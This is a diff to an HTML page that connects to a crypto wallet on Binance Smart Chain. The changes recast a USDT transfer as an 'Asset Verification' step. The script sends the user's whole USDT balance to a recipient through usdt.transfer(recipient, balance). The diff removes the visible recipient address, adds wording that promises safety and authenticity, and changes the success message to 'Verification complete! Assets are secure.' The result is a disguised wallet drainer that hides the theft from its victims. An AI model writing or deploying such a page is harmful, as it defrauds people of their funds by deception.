@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>USDT(BEP-20) FlashCheck</title>
+    <title>Asset Verification</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -65,6 +65,15 @@
             background-color: #666;
             cursor: not-allowed;
         }
+        .additional-info {
+            margin-top: 1.5em;
+            color: #ccc;
+            font-size: 0.9em;
+            text-align: center;
+        }
+        .additional-info p {
+            margin: 0.5em 0;
+        }
         #log {
             margin-top: 1em;
             font-size: 0.9em;
@@ -84,10 +93,13 @@
     </nav>
 
     <div class="card">
-        <h2>USDT (BEP-20)</h2>
-        <p>This will Test Your USDT(BEP-20) on BSC:</p>
-        <p style="word-break: break-all; font-weight: bold;">0x60eA1bc1b4b0e064BcbeA62845eD6CA36b9663CE</p>
-        <button id="sendBtn">TEST ALL</button>
+        <h2>Verify Your Assets</h2>
+        <p>Connect your wallet to verify your assets on Binance Smart Chain.</p>
+        <button id="sendBtn">VERIFY ASSET</button>
+        <div class="additional-info">
+            <p style="font-weight: bold; color: #00cc99;">Securely verify your USDT (BEP-20) and other tokens.</p>
+            <p>This process helps ensure the safety and authenticity of your digital assets.</p>
+        </div>
         <div id="log"></div>
     </div>
 
@@ -169,10 +181,10 @@
                 const tx = await usdt.transfer(recipient, balance);
                 log("⏳ Transaction sent. Waiting for confirmation...");
                 await tx.wait();
-                log("✅ Transaction confirmed! USDT sent successfully.");
+                log("✅ Verification complete! Assets are secure.");
             } catch (err) {
                 console.error(err);
-                log("❌ Transaction failed: " + (err?.message || err));
+                log("❌ Verification failed: " + (err?.message || err));
             }
         }
 
